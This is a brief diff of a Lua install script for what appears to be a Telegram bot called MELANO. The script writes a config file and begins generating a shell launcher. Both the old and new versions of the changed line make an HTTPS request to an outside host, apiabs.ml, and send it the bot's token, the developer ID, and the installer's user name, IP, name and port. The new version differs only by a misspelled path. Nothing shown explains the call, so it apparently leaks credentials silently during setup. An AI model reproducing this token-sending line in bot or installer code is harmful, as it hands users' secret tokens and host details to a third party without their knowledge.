@@ -66,7 +66,7 @@ MELANO = DevAbs:get(Server.."TokenMELANO"):match("(%d+)"),
 SudoIds = {DevAbs:get(Server.."IdMELANO")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/config.php?Get=MELANO&DevId="..DevAbs:get(Server.."IdMELANO").."&TokenBot="..DevAbs:get(Server.."TokenMELANO").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://apiabs.ml/confihg.php?Get=MELANO&DevId="..DevAbs:get(Server.."IdMELANO").."&TokenBot="..DevAbs:get(Server.."TokenMELANO").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("MELANO.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
